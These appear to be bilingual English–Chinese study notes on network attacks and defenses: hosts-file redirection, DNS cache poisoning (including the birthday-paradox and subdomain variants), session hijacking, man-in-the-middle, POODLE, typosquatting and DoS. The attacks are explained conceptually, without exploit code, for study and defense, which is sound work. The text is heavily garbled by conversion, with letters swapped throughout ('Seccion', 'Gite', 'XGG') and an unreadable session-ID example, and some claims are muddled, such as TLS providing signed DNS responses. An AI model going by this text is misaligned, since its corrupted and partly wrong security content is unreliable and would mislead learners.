This file is in the C:\Windows\System32\drivers\etc\ include IP addresses along with host name mappings.
By default, it doesn’t have anything other than comments on current Windows computers.
However, a mapping might look like this:
127.0.0.1 localhost
13.207.21.200 google.com
  - The first entry: maps localhost to the loopback IP address of 127.0.0.1.
  - The second entry: maps google.com to the IP address of bing.com (13.207.21.200).
If a user enters google.com into the address bar of a browser, the browser will instead go to bing.com.
         ▪


##  if the IP address points to a malicious server, this might cause the system to download malware.
DDoS DNS Attacks
It’s difficult to take down the Internet. However, a cyberattack in October 2016 effectively did so for millions of users in North America and Europe.
- Specifically, on October 21,
- attackers launched three DDoS attacks during the day at 7:00 a.m.,
at 11:52 a.m., and at 4:00 p.m.
- These attacks prevented users from accessing a multitude of sites,
such as Amazon, CNN, Fox News, Netflix, PayPal, Reddit, Spotify,
Twitter, Xbox Live, and more.
- Attackers infected many Internet-connected devices, such as video
cameras, video recorders, printers, and baby monitors, with malware
called Mirai.
- Mirai forces individual systems to become bots within large botnets.
- On October 21, they sent commands to millions of infected devices
directing them to repeatedly send queries to DNS servers.
- These queries overwhelmed the DNS servers and prevented regular
users from accessing dozens of websites.
- These three attacks were launched against DNS servers maintained
by Dyn, Inc., an Internet performance management company.
- it is possible to seriously disrupt DNS services, causing Internet
access problems for millions of people.
Pharming and Phishing resolve to false IP addresses of his own malicious servers, leading the victim to view or download undesired content, such as malware.
One of the main uses of pharming is to resolve a domain name to a web site that appears identical to the requested site, but is instead designed for a malicious intent.
phishing 网络仿冒: try to grab usernames and passwords, credit card numbers, and other personal information.
Victims of a combined pharming and phishing attack would have no way of distinguishing between the fake and real sites, since all of the information conveyed by the browser indicates that they are visiting a trusted web site.
Some types of pharming attacks:
email relies on specialized DNS entries known as MX records, possible pharming attack allows an attacker to redirect mail intended for certain domains to a malicious server that steals information. Many online services allow password recovery through email, could be identity theft.
Other pharming attacks: associate the domain name used for OS updates with a malicious IP address, causing victims to automatically download and execute malicious code instead of a needed software patch. In fact, the possibilities of damage from pharming attacks are nearly endless because of the large degree of trust placed on the truthfulness of domain-name resolutions.
DNS compromises can have dire consequences for Internet users.
DNS Cache Poisoning DNS 快取污染
- attacker trick DNS server to cache a false DNS record,
  - Let clients issuing DNS requests to that server
  - resolve domains to attacker-supplied IP addresses. - 跟 ARP 一樣，DNS 若讀到一組不正確的紀錄，那他就會被影響到， 而且還會把這筆不正確的紀錄告訴別人。然後一段時間內，被影響到 的 DNS 伺服器都會給出不正確的資訊。由於 DNS 是樹狀結構，所以 DNS 快取污染會影響到附近的 DNS 伺服器。
•
- DNS uses a 16-bit request identifier to pair queries with answers
- 正常的狀況下，DNS 伺服器問別人資訊時:
  - 先驗證「這筆資訊是不是合理的」(如使用 DNSSEC) - Cache may be poisoned when a name server:
  - Disregards identifiers
  - Has predictable ids
  - Accepts unsolicited DNS records
1. An attacker launch a DNS cache poisoning attack against an ISP DNS server.
  - 攻擊方的網域名稱是   , IP
  - 被攻擊方ISP DNS server是
2. Attacker rapidly transmits DNS queries to ISP DNS server target,
queries an authoritative name server on behalf of Eve. 需要解
析 attacker.here。不過被攻擊方並不知道這個網域，所以他要去問別 人。
  - 他會和另一台伺服器這樣問「attacker.here 的位置是啥?」
  - Attacker.here. IN A
3. Eve simultaneously sends a DNS response to her own query,
spoofing the source IP address as originating at the authoritative name server, with the destination IP set to the ISP DNS server target.
 attacker.here
1.1.1.1
 target.here
  ⁃
  - attacker.here 是指向
  - 然後我還知道   是對到 1.1.1.1
4. 假設被攻擊方完全不做檢查, The ISP server accepts Eve’s forged response, caches a DNS entry associating the domain Eve
requested with the malicious IP address Eve provided in her forged
responses.
5. At this point, any downstream users of that ISP, will be directed to
Eve’s malicious web site when they issue DNS requests to resolve the domain name targeted by Eve. 每個人問他 attacker.here，他都會 回 1.1.1.1(即使他的 IP 根本不是這個)
  ns.target.here
 ns.target.here
  There are several obstacles to issue a fake DNS response that will be accepted.
First, an attacker must issue a response to her own DNS query before the authoritative name server respond.
  - It is easily overcome, however, because if the attacker forces the target name server to query external authoritative name servers, she can expect that her immediate, direct response will be received before these external name servers have a ▪


## chance to perform a lookup and issue a reply. Second, each DNS request is given a 16-bit query ID.
  - If the response to a query donot have same ID like request, it will be ignored.
  - If he successfully guesses the random query ID chosen by the ISP DNS server, the response will be cached.
  - This guessing is actually more likely if the attacker issues a lot of fake requests and responses to the same domain name lookup.
  - In 2002, most major DNS software simply used sequential numbers for query IDs, allowing easy prediction and circumvention of this naive authentication. Once this bug was disclosed, most DNS software vendors implement randomization of query IDs.
防禦方式DNS Cache Poisoning Prevention
基本上，DNS 快取污染的防禦都是，都是「不要那麼相信對方跟你講的
話」，以及「不要理會你沒問的東⻄」。
· 其中一種方式，是使用 HTTPS 的數位簽章來解決掉偽造主機的問題。
Use random identifiers for queries Always check identifiers
Port randomization for DNS requests
另一種: 目前常見的防禦方式: DNSSEC
  - Challenging because it is still being deployed and requires
reciprocity
DNSSEC Domain Name System Security Extensions a suite of extensions to DNS
security specifications for security DNS, provides validation for DNS responses.
It adds a digital signature to each record, provides integrity.
If a DNS server receives a DNSSEC-enabled response with digitally signed records,
   ▪


##   - the DNS server knows that the response is valid.
BEST supports the deployment DNSSEC at the organization: TLS involves many security features:
  - like digitally signed DNS responses.
  - mitigate the risk of DNS attacks: like DNS poisoning.
  - Provides cryptographic authenticity of responses using
Resource Record Signatures (RRSIG)
  - and authenticated denial of existence using Next-Secure (NSEC) and Hashed-NSEC records (NSEC3).
Guarantees:
  - Authenticity of DNS answer origin
  - Integrity of reply
  - Authenticity of denial of existence
Accomplishes this by signing DNS replies at each step of the way Uses public-key cryptography to sign responses
typically use trust anchors, entries in the OS to bootstrap the process
This is also related to DNS resolution.
  - When DNS resolution process is sent in clear text, vulnerable to packet sniffing.
  - Therefore, DNS resolution should also be secured/encrypted.
        DNS Cache Poisoning and the Birthday Paradox
increase in fake requests to increase in attack success probability is a result of a principle known as the birthday paradox 生日悖论:
the probability of two or more people in a group of 23 sharing the same
birthday is greater than 50%.
In a group of 23 people, there are actually (23*22)/2 = 253 pairs of birthdays, and it only takes one matching pair for the birthday paradox to hold.
p(n) = n个人中每人的生日日期都不同的概率。 假如n > 365，其概率为0
假设n ≤ 365，则概率为:
因为第二个人不能跟第一个人有相同的生日(概率是364/365),第三个人不能 跟前两个人生日相同(概率为363/365),依此类推。
   用阶乘可以写成如下形式: p(n)表示n个人中至少2人生日相同的概率, n≤365
n大于365时概率为1。 n=23发生的概率大约是0.507
:
 Let us apply the reasoning of the birthday paradox to DNS cache poisoning.
An attacker issuing a fake response, guess a transaction ID, n different 16-bit real IDs XXXXXXXXXXXXXXXX, probability = n/216;
hence, she would fail to match one with probability 1 − n/216.
Thus, an attacker issuing n fake responses will fail to guess a transaction ID equal to one of n different 16-bit real IDs with probability  when n = 213, attacker will have roughly at least a 50% chance that one of her random responses will match a real request.
A DNS cache poisoning attack based on the birthday paradox:
(a) First, an attacker sends n DNS requests for the domain she wishes to poison.
(b) The attacker sends n corresponding replies for her own request. If she successfully guesses one of the random query IDs chosen by
the ISP DNS server, the response will be cached.
Hashed passwords is susceptible to birthday attacks.
 Subdomain DNS Cache Poisoning
Despite the birthday paradox, the above guessing attack is extremely limited because of its narrow time frame.
when a correct response to a DNS query is received, that result is cached by the receiving server and stored for the time specified in the time-to-live field.
When a name server has a record in its cache, it uses that record rather than issuing a new query to an authoritative name server.
As a result, the attacker can only make as many guesses as he can send in the time between the initial request and the valid reply from the authoritative name server.
On each failed guessing attempt, the valid (harmless) response will be cached by the targeted name server, so the attacker must wait for that response to expire before trying again.
Responses may be cached for minutes, hours, or even days, so this slowdown makes the attack described above almost completely infeasible.
Unfortunately, a new subdomain DNS cache poisoning attack in 2008, allows attackers to successfully perform DNS cache poisoning by 2 new techniques:
1. Issues requests for different nonexistent subdomain of the target domain.
Rather than issuing a request and response for a target domain like example.com, only allow one attempt at a time, the attacker issues many requests, each for a different nonexistent subdomain of the target domain.
example: the attacker might send requests for subdomains aaaa.example.com, aaab.example.com, aaac.example.com, and so on.
These subdomains don’t actually exist, so the name server for the target domain, example.com, just ignores these requests.
Simultaneously, the attacker issues responses for each of these requests, each with a guessed transaction ID.
The attacker now has so many chances to correctly guess the response ID, no competition from the target domain to worry about, it is relatively likely that the attack will be successful.
This new attack was shown to be successful against many popular DNS software packages, including BIND, the most commonly used system.
2. Include glue record that resolves the name server of target domain to attacker-controlled server.
Rather than simply reply with an address for each fake subdomain like abcc.example.com, the attacker’s responses include a glue record that resolves the name server of the target domain, example.com, to an attacker-controlled server.
Using this strategy, on successfully guessing the transaction ID
Attacker can control not just one DNS resolution for a nonexistent domain but all resolutions for the entire target domain.
Client-Side DNS Cache Poisoning Attacks attack can be conducted against a target client.
 A DNS cache poisoning attack against a client:
(a) On visiting a malicious web site, the victim views a page containing many images, each causing a separate DNS request to a nonexistent subdomain of the domain that is to be poisoned.
(b) The malicious web server sends guessed responses to each of these requests.
On a successful guess, the client’s DNS cache will be poisoned.
An attacker can construct a malicious web site containing HTML tags that automatically issue requests for additional URLs such as image tags. These image tags each issue a request to a different nonexistent subdomain of the domain the attacker wishes to poison.
When the attacker receives indication that the victim has navigated to this page, he can rapidly send DNS replies with poisoned glue records to the client.
On a successful attack, the client will cache the poisoned DNS entry.
This type of attack is especially stealthy, since it can be initiated just by someone visiting a web site that contains images that trigger the attack. These images will not be found, of course, but the only warning the user has that this is causing a DNS cache poisoning attack is that the browser window may display some icons for missing images.
NXDOMAIN attack
This is a type of DNS flood attack where an attacker inundates a DNS server with requests, asking for records that don’t exist, in an attempt to cause a denial-of- service for legitimate traffic. This can be accomplished using sophisticated attack tools which can auto-generate unique subdomains for each request. NXDOMAIN attacks can also target a recursive resolver with the goal of filling the resolver’s cache with junk requests.
Phantom domain attack:
A phantom domain attack has a similar result to an NXDOMAIN attack on a DNS resolver. The attacker sets up a bunch of ‘phantom’ domain servers which either respond to requests very slowly or not at all. The resolver is then hit with a flood of requests to these domains and the resolver gets tied up waiting for responses, leading to slow performance and denial-of-service.
Random subdomain attack
The attacker sends DNS queries for several random, non-existent subdomains of one legitimate site. The goal is to create a denial-of-service for the domain’s authoritative nameserver, making it impossible to lookup the website from the nameserver. As a side effect, the ISP serving the attacker may also be impacted, as their recursive resolver's cache will be loaded with bad requests.
Domain lock-up attack:
 Bad actors orchestrate this form of attack by setting up special domains and resolvers to create TCP connections with other legitimate resolvers. When the targeted resolvers send requests, these domains send back slow streams of random packets, tying up the resolver’s resources.
Botnet-based CPE attack:
These attacks are carried out using CPE devices (Customer Premise Equipment, this is hardware given out by service providers for use by their customers, such as modems, routers, cable boxes, etc.) The attackers compromise the CPEs and the devices become part of a botnet, used to perform random subdomain attacks against one site or domain.
 domain name kiting 空头支票:
When a new domain name is issued, technically a five-day grace period before you must pay for it. Those engaged in kiting can delete the account within the five days and re-register it, allowing them to have accounts that they never have to pay for.
Domain Hijacking
- involves an individual changing the domain registration information for a site without the original registrant’s permission.
- Once hijacked, often the website is replaced by one that looks identical but that records private information (passwords) or spreads malware.
- Attackers often do so with social engineering techniques to gain unauthorized access to the domain owner’s emailaccount. Example
Homer sets up a domain: homersimpson.com.
He uses his Gmail to registers it,
Attackers watch his Facebook page and notice that he often adds simple comments like “Doh!”
Later, they try to log on to his Gmail with a brute force attempt.
They try the password of Doh!Doh! and get in.
They then go to the domain name registrar, and use the Forgot Password feature.
It sends a link to Homer’s Gmail account to reset the password.
After resetting the password at the domain name registrar site, the attackers change the domain ownership.
They also delete all the emails tracking what they did.
Later, Homer notices his web site is completely changed and he no longer has access to it.
Hijacking and Related Attacks
Clickjacking
- attacker using multiple transparent or opaque layers
- to trick a user into clicking a button / link on another page when they were
intending to click on the top- level page.
- When an user thinks that they are clicking on the link, they are actually activating the invisible button to a completely different site—often then asking information that is collected by the miscreant for future malevolent purposes. ▪


##   - A frame allows one web page to display another web page within an area defined as a frame or iframe.
web developers implement new standards to defeat them.
Most methods focus on breaking or disabling frames.
ensures that attackers cannot display your web page within a frame on their web
page. Example
the Facebook share example is thwarted by Facebook web developers adding code to their web pages preventing the use of frames.
Session Hijacking Cookie/Session poisoning
Session Hijacking通常會搭配DoS增加搶到的機率。搶的時機點應在user session id建立後
The item used to validate a user’s session (like cookie), is stolen and used by another to establish a session with a host that thinks it is still
communicating with the first party.
reverse engineers vulnerable cookies to impersonate a valid user or gain control of a user's session.
takes advantage of session IDs stored in cookies.
  - When a user logs on to a web site, the web site often returns a small text file (cookie) with a session ID.
  - In many cases, this cookie is stored on the user’s system and remains active until the user logs off.
   ▪


##   - If the user closes the session and returns to the web site, the web site reads the cookie and automatically logs the user on.
  - This is convenient for the user, but can be exploited by an attacker.
搶Session ID的方法:use the user’s session ID to impersonate the user. (1)XSS:利用使用者對於網站本身的信任 (2)CSRF:利用使用者對於瀏覽器的信任
(3)Session Replay:重送在使用者認證過程中攔截到的token
The web server doesn’t know the difference because it only identifying the user based on the session ID.
Attackers can read cookies installed on systems through several
methods, such as through cross-site scripting attacks. Once they have the session ID, they can insert it into the HTTP header and send it to the web site.
If the web server uses this session ID to log the user on automatically, it gives the attacker access to the user’s account.
Numerous types of attacks use session hijacking, like man-in-the- middle and sidejacking.
A weakness in a Firefox extension made news when it became
known that an exploit made it possible for public Wi-Fi users to fall prey to this type of attack. (Firesheep was an extension created to take advantage of the weakness.)
prevent:
  - encrypt the sessions,
  - log out of sites when finished,
  - perform secondary checks on the identity of the user.
Forms of Session Hijacking
Man-in-the-middle
- Sidejacking - This attack involves sniffing data packets to steal session cookies and hijack a user’s session. These cookies can contain unencrypted lOSIn information, even if the site was secure.
- Evil Twin - This is a rogue Wi-Fi network that appears to be a 1,979

legitimate network. When users unknowingly join the rogue network, the attacker can launch a man-in-the-middle attack, intercepting all data between you and the network.
- Sniffing - This involves a malicious actor using readily available software to intercept data being sent from, or to, your device.
Session Hijacking
assume an authenticated TCP session between two hosts.
- The attacker intercepts the session and takes over the legitimate
authenticated session.
- When a session authentication process is complete, and the user is
authorized to use resources such as web services, TCP communication or other, the attacker takes advantage of this authenticated session and places himself in between the authenticated user and the host.
- Authentication process initiates at the start of TCP session only, once the attacker successfully hijacks the authenticated TCP session, traffic can be monitored, or attacker can get the role of the legitimate authenticated user.
- Session hijacking becomes successful because of weak session IDs or no blocking upon receiving an invalid session ID.
 Session Hijacking Techniques
Session Hijacking process is categorized into the following three techniques:
1. Stealing
  - different technique of stealing session ID
  - such as "Referrer attack" network sniffing, Trojans or by any
other mean.
2. Gueccing
  - include tricks and techniques used to guess the session ID
  - such as by observing the variable components of session IDs
or calculating the valid session ID by figuring out the sequence
etc.
3. Brute-Forcing
  - Brute-Forcing is the process of guessing every possible
combination of credential. Usually, Brute-Forcing is performed when an attacker gains information about the range of Session ID.
Session Hijacking Process
1. Sniffing
  - Attacker attempt to place himself in between victim and target in order to sniff the packet.
2. Monitoring
  - Monitor the traffic flow between victim and target.
3. Seccion Decynchronization 去同步
  - The process of breaking the connection between the victim and
the target.
4. Seccion ID
  - Attacker takes control over the session by predicting the session ID.
5. Command Injection
  - After successfully taking control over the session, the attacker starts injecting the commands.
  Types of Session Hijacking
- Active Attack
 ⁃
  - includes interception in the active session from the attacker.
  - An attacker may send packets to the host in the active attack.
  - In an active attack, the attacker is manipulating the legitimate
users of the connection.
  - As the result of an active attack, the legitimate user is
disconnected from the attacker.
- Paccive Attack  ⁃
  - The passive attack includes hijacking a session and monitoring the communication between hosts without sending any packet.
Session Hijacking in 0SI Model
1. Network Level Hijacking
  - includes hijacking of a network layer session such as TCP or UDP session.
2. Application Level Hijacking
  - includes hijacking of Application layer such as hijacking HTTPS
session.
Spoofing vs. Hijacking
- The major difference between spoofing and Hijacking is of the active session.
- spoofing attack
  - the attacker is pretending to be another user by impersonating
to gain access.
  - The attacker does not have any active session; it initiates a new
session with the target with the help of stolen information.
- Hijacking
  - basically the process of taking control over an existing active session between an authenticated user and a target host.
  - The attacker uses the authenticated session of a legitimate user without initiating a new session with the target.
Application Level Session Hijacking
Application-Level Hijacking Concept - Session hijacking as defined focuses on the application layer of the OSI model.
- In the application layer hijacking process, the attacker is looking for a legitimate session ID from the victim in order to gain access to an authenticated session which allows the attacker to avail web resources.
- For example, attacker, with an application layer hijacking can access the website resources secured for authenticated users only.
- The web server may assume that the incoming request forms the known host whereas an attacker has been hijacked the session by predicting the session ID.
Compromicing Seccion IDs ucing Sniffing
- Session sniffing is another flavor of sniffing in which an attacker is looking for the session ID / Session Token.
- Once the attacker has the found the session ID, it can gain access to the resources.
Compromicing Seccion IDs by Predicting Seccion Token
- Predicting the session ID is the process of observing the currently occupied session IDs by the client.
- By observing the common and variable part of the session key, an attacker can guess the next session key.
- How to Predict a Seccion Token?
  - Web servers normally use random session ID generation to prevent prediction however some web servers use customer defined algorithms to assign session ID.
  - For example, as shown below:
  - After observing the above session IDs, you can easily identify the constant part and other variable parts.
  - ABCD is the constant part,
  - Œ1Œ1fiŒ17 is a date.
  - and the last section is the time.
   - http://www.example.com/ABCDŒ1Œ1fiŒ171Pfi51Œ
  - http://www.example.com/ABCDŒ1Œ1fiŒ171P171Œ
  - http://www.example.com/ABCDŒ1Œ1fiŒ171P175Œ
  - http://www.example.com/ABCDŒ1Œ1fiŒ171P18fiŒ
  - http://www.example.com/ABCDŒ1Œ1fiŒ171PfiŒ1Œ
   - An attacker may attempt with the following session ID at 1P:Z5:1O
Compromising Session IDs Using Man-in-the-Middle Attack
- The process of compromising the session ID using Man-in-the-Middle attack requires splitting of the connection between Victim and Web server into two connections, one of them between Victim-to-Attacker and another between Attacker-to-Server.
Compromising Session IDs Using Man-in-the-Browser Attack
- Compromising Session ID using Man-in-the-Browser attack requires a Trojan, already deployed on the target machine.
- The trojan can either change the proxy settings, redirecting all traffic through the attacker whereas another technique using Trojan is that intercept the process between the browser and its security mechanism.
Stepc to Perform Man-in-the-Browcer Attack
- To launch Man-in-the-Browser attack;
1. the attacker first infected the victim's machine using a Trojan.
2. Trojan installs malicious code in the form of an extension on the
victim's machine and which modifies the browser's configuration
upon boot.
3. When a user logged into the site, URL is checked against a
known list of the targeted website;
4. the Event handler will register the event when it is detected.
5. Using DOM interface attacker can extract and modify the
values when the user clicks the button.
6. The browser will send the form with modified entries to the web
server.
7. As the browser shows original transaction details, the user
could not identify any interception.
Compromising Session IDs Using Client-side Attacks
Session IDs can be compromised easily by using Client-side attacks such as:  1. 1. Cross-Gite Gcripting (XGG)
2. Malicious JavaGcript Code
3. Trojans
Crocc-site Script Attack
- performed by an attacker by sending a crafted link with a malicious script.
- When the user clicks this malicious link, the script will be executed.
- This script may be coded to extract the Session IDs and send it to the
attacker.
Crocc-site Requect Forgery Attack
- the process of obtaining the session ID of a legitimate user and exploiting the active session with the trusted website in order to perform malicious activities.
Session Replay Attack
- Attacker captures the authentication token from user intended for the server and replays the request to the server resulting in unauthorized access to the server.
Session Fixation
- Session Fixation is an attack permitting the attacker to hijack the session.
- The attacker has to provide valid session ID and make the victim's browser to use it.
- It can be done y the following technique
  - Session Token in URL argument   - Session Token in hidden form
  - Session ID in a cookie
- To understand the Session Fixation attack, assume an attacker,
victim, and the web server.
  - The atttacker initiates a legitimate connection with the web
server, issues a session ID or uses a new session ID.
  - The attacker then sends the link to the victim with the
established session ID for bypassing the authentication.
  - When the user clicks the link and attempts to log into the
website, web server continues the session as it is already
established, and authentication is performed.
  - Now, the attacker already has the session ID information will
continue using a legitimate user account.
Network-level Session Hijacking
- Network-Level hijacking is focused on Transport layer and Internet layer protocols used by the application layer. Network level attack results in extracting information which might be helpful for application layer session.
- There are several types:
  - Blind Hijacking
  - UDP Hijacking
  - TCP/IP Hijacking
  - RST Hijacking
  - MITM
  - IP Spoofing
The 3-May Handshake
- TCP communication initiates with the 3-way handshaking between requesting host and target host.
- In this handshaking Synchronization (SVN) packets and Acknowledgment (ACK) packets are communicated between them.
 TCP/IP Hijacking
- TCP/IP hijacking process is the network level attack on a TCP session in which an attacker predicts the sequence number of a packet flowing between victim and host.
- To perform TCP/IP attack, the attacker must be on the same network with the victim. Usually, the attacker uses sniffing tools to capture the packets and extract the sequence number.
- By injecting the spoofed packet session can be interrupted.
- Communication from the legitimate user can be disrupted by a
Denial-of-Service attack or Reset connection.
Source Routing
- Source routing is a technique of sending the packet via selected route.
- In session hijacking, this technique is used to attempt IP spoofing as a legitimate host with the help of Source routing to direct the traffic through the path identical to the victim's path.
RST Hijacking
- RST hijacking is the process of sending Reset (RST) packet to the victim with the spoofed source address.
- Acknowledgment number used in this Reset packet is also predicted.
- When the victim receives this packet, it could not identify that the
packet is spoofed
  - believing the actual source has sent the packet resulting in
resetting the connection.
  - RST packet can be crafted using packet crafting tools.
Blind Hijacking
- the technique in which attacker is not able to capture the return traffic.
- attacker captures the packet coming from victim destined towards the
server, inject malicious packet and forward to the target server.
Forged ICMP and ARP Spoofing
A man-in-the-middle attack can also be performed by using Forged ICMP packet and ARP spoofing techniques. Forged ICMP packets such as Destination unavailable or high latency message are sent to fool the victim. UDP Hijacking
- UDP Session Hijacking process is quite simpler than TCP session hijacking.
- Since the UDP is a connectionless protocol, it does not require any sequence packet between requesting client and host.
- UDP session hijacking is all about sending the response packet before a destination server responds.
- There are several techniques to intercept the coming traffic from the destination server
Countermeasures
- Session Hijacking Countermeasures
  - Mitigation of Session Hijacking attacks includes several detection techniques and countermeasures that can be implemented including manual and automated processes.
  - Deployment of Defense-in-depth technology, Network monitoring devices such as Intrusion Detection System (IDS) and Intrusion Prevention System (IPS) are categorized as automated detection process.
  - There are several Packet sniffing tools available which can be used for manual detection.
- encrypted session and communication using Secure Shell (SSH), using HTTPS instead of HTTP,
- using Random and lengthy string for Session ID, session timeout,
- strong authentication like Kerberos can be helpful to prevent and
mitigate session hijacking.
- Using IPsec and SSL can provide stronger protection against
hijacking.
IPSec
- IPSec stands for IP security. As the name suggests, it is used for the security of general IP traffic.
- The power of IPsec lies in its ability to support multiple protocols and algorithms.
- It also incorporates new advancements in encryption and hashing protocols.
- The main objective of IPGec is to provide CIA (confidentiality, integrity, and authentication) for virtual networks used in current networking environments. - IPSec makes sure the above objectives are in action by the time packet enters a VPN tunnel until it reaches the other end of the tunnel.
- Confidentiality.
  - IPSec uses encryption protocols namely AES, DES, and 3DES
for providing confidentiality.
- Integrity.
  - IPSec uses hashing protocols (MD5 and SHA) for providing integrity.
  - Hashed Message Authentication (HMAC) can also be used for checking the data integrity.
- Authentication algorithms. RGA digital signatures and pre-shared keys (PGK) are two methods used for authentication purposes.
 CmponentS ofIPcec
- Components of IPsec includes:
  - Components of IPsec
  - IPsec Drivers   - Internet Key Exchange (IKE)
  - Internet Gecurity Association Key Management Protocol
  - Oakley
  - IPsec Policy Agent
Modes of IPcec
two working modes
tunnel and trancport mode.
Each has its features and implementation procedure.
IPSec Tunnel Mode
- Being the default mode set in Cisco devices, tunnel mode protects the entire IP packet from originating device.
- It means for every original packet; another packet is generated with new IP header and send over the untrusted network to the VPN peer located on another end of the lOSIcal connection. Tunnel mode is commonly used in case of Gite-to-Gite VPN where two secure IPGec gateways are connected over public internet using IPGec VPN connection. Consider the following diagram:
- This shows IPGec Tunnel Mode with EGP header:
•
- Gimilarly, when AH is used; new IP Packet format will be:
•
IPsec Transport Mode
- IPsec VPN secures the data field or payload of originating IP traffic by using encryption, hashing or both.
- New IPsec headers encapsulate only payload field while the original IP headers remain unchanged.
- Tunnel mode is used when original IP packets are the source and
 ▪


## destination address of secure IPsec peers.
- For example,
  - securing the management traffic of router is a perfect example of IPsec VPN implementation using transport mode.
  - From a configuration point of view, both tunnel and transport modes are defined in the configuration of trancform cet. It will be covered in the Lab scenario of this section.
- This diagram shows IPsec Transport Mode with EGP header:
•
- Gimilarly, in case of AH:
•
Man-in-the-Middle Attacks
   Clandestinely 秘密地 place something (like software, rouge router)
between server and user, and no one is aware.
  - Intercepts data and sends the information to the server as if
nothing is wrong.
  - The server responds to the software, as it is the legitimate
client.
 ▪


##   - may recording information, altering it, or in other way compromising the security of your system and session.
an active attack.
  - Something is actively intercepting the data and may altering it.
  - a form of active interception/eavesdropping.
It uses a separate computer that accepts traffic from each party in a
conversation and forwards the traffic between the two.
  - The two computers are unaware of the MITM computer, and it
can interrupt the traffic at will or insert malicious code. Address Resolution Protocol (ARP) poisoning is one way that an
attacker can launch an MITM attack.
best remediation:
- Requiring client and server PKI certificates for all connections Kerberos helps prevent man-in-the-middle attacks with mutual
authentication.
  - doesn’t allow a malicious system to insert itself in the middle of the conversation without the knowledge of the other two systems.
Threat of man-in-the-middle attacks on wireless networks has increased. no necessary to connect to the wire
malicious rogue can be outside the building intercepting packets, altering them, and sending them on.
common solution:
  - enforce secure wireless authentication protocol, like WPA2.
POODLE SSLv3 Vulnerability - POODLE (Padding Oracle On Downgraded Legacy Encryption)
- Allows attacker to read information encrypted with SSLv3, decipher the plain text content, using a MITM attack. when decrypting messages encrypted using block ciphers in cipher block chaining (CBC) mode.
  - affects any services or clients communicate using SSLv3.
  - affects every piece of software that can be coerced into
       communicating with SSLv3. (any software that implements a fallback mechanism that includes SSLv3 support is vulnerable and can be exploited.)
  - Common: web browsers, web servers, VPN servers, mail servers, etc.
- Although SSLv3 is an older version of the protocol which is mainly obsolete, many pieces of software still fall back on SSLv3 if better encryption options are not available. More importantly, it is possible for an attacker to force SSLv3 connections if it is an available alternative for both participants attempting a connection.
- POODLE vulnerability:
  - because the SSLv3 protocol does not adequately check the
padding bytes that are sent with encrypted messages.
  - Since these cannot be verified by the receiving party,
  - an attacker can replace these and pass them on to the intended
destination.
  - When done in a specific way, the modified payload will
potentially be accepted by the recipient without complaint.
  - An average of once out of every 256 requests will accepted at
the destination, allowing the attacker to decrypt a single byte.
  - This can be repeated easily in order to progressively decrypt
additional bytes.
  - Any attacker able to repeatedly force a participant to resend
data using this protocol can break the encryption in a very short
amount of time.
  - Protect:
  - Actions to ensure that you are not vulnerable as both a client and a server.
  - Since encryption is usually negotiated between clients and servers, it is an issue that involves both parties.
  - Servers and clients should should take steps to disable SSLv3 support completely.
  - Many applications use better encryption by default, but implement SSLv3 support as a fallback option.
  - This should be disabled,
  - a malicious user can force SSLv3 communication if
both participants allow it as an acceptable method. ▪


## TCP/IP hijacking
An older term generically used for all man-in-the-middle attacks.
  - attacker gain access to a host in network and logically
disconnecting it from the network.
  - The attacker then inserts another machine with the same IP
address.
  - This happens quickly, and it gives the attacker access to the session and to all the information on the original system.
  - The server won’t know that this has occurred, and it will respond as if the client is trusted—the attacker forces the server to accept its IP address as valid.
  - The hijacker will hope to acquire privileges and access to all the information on the server.
Can do little to counter this threat
  - but attacks require fairly sophisticated software
  - are harder to engineer than a simple DoS attack.
   issue regarding certificates on a secure website.
the web gateway proxy on the local network has signed all of the certificates on the local machine.
the proxy has been legitimately programmed to perform man-in-the- middle attacks
   MITM attack aimed at impersonating the default fateway is underway. - To detect this attack:
  - Ipconfig
  - Tracert
  - Implement a logon script to prevent MITM:
  - arp - s 192.168.1.1 00-3a-d1-fa-b1-06
Man-in-the-Browser (MITB, MitB, MIB, MiB) a type of man-in-the-middle attack a proxy Trojan horse
infects vulnerable web browsers.
man-in-the-browser attacks
can capture browser session data. This includes keyloggers to capture keystrokes, along with all data sent to and from the web browser.
manipulates calls between the browser and its security mechanisms, sniffing or modifying transactions as they are formed on the browser yet still displaying back the user’s intended transaction.
Example:
Zeus: a Trojan horse that has used man-in-the-browser techniques after infecting systems.
Zeus includes keystroke logging and form grabbing.
Once the attackers collect logon information for a user’s bank, they use it to log on and transfer money to offshore accounts. Typo Squatting, URL Hijacking
the same.
the act of registering domains that are similar to known entity, based on a misspelling
or typographical error.
Example, Sybex.com to Sybecks.com
buy a similar domain for a variety of reasons
  - Hosting a malicious web site: try to install drive-by malware on users’ systems when they visit. may have Trojans, worms, and viruses
  - Earning ad revenue: attacker can host pay-per-click ads. When click on the ads, advertisers pay revenue to the attacker.
  - Reselling the domain: Attackers can buy domain names relatively cheaply, but resell them to the owner of the original site for a hefty profit.
Best defense: register all those domains around yours, includes top-level domains as well (.com, .biz, .net, and so on) for all reasonable deviations of your site.
Denial-of-Service
Distributed Denial-of-Service Attacks DoS的目標不是打服務，而是打掉對方的網路與資源，造成社交攻擊的機會 DoS攻擊手法:
(1)Bandwidth Attack:發送大量ICMP ECHO封包。
(2)Service Request Floods:要求對方回應自己快速發出的所有 requests。
(3)SYN Flooding:送出大量SYN封包，讓對方一直等待到記憶體用盡。 (4)ICMP Flood Attack:送出大量假地址的ICMP，使其回應給假地址，造 ▪


## 成放大效果。
(5)Peer-to-Peer Attack:利用DC++(Direct Connect)埠打DoS。 (6)Permanent Denial-of-Service Attack:針對硬體做攻擊。 (7)Application-Level Flood Attack:針對應用層發起的攻擊。 (8)Distributed Reflection DoS(DRDoS):假冒對方身份向其他主機發 出某種類型封包，讓其他主機回應給對方。
denial-of-service (DoS) attack: attack from one attacker against one target.
distributed denial-of-service (DDoS) attack: attack from two or more computers against a single target.
Denial-of-Service (DoS):
Most simple DoS attacks occur from a single system, and a specific
server or organization is the target. Several types of attacks can occur:
Deny access to information, applications, systems, or
communications.
Bring down a website while the communications and systems continue to operate.
Crash the operating system (a simple reboot may restore the server to normal operation).
Fill the communications channel of a network and prevent access by authorized users.
Open as many TCP sessions as possible. This type of attack is called a TCP SYN flood DoS attack.
Two of the most common types of DoS attacks:
ping of death: crashes system by sending Internet Control Message
Protocol (ICMP) packets (think echoes) that are larger than the system can handle.
  - sPing.
buffer overflow: put more data (usually long input strings) into the
buffer than it can hold.
  - Code Red, Slapper, and Slammer: took advantage of buffer
         ▪


## overflows
Type of DoS: Smurf attacks
SYN floods
Local area network denial (LAND) fraggle.
distributed denial-of-service (DDoS) attack
similar to a DoS attack.
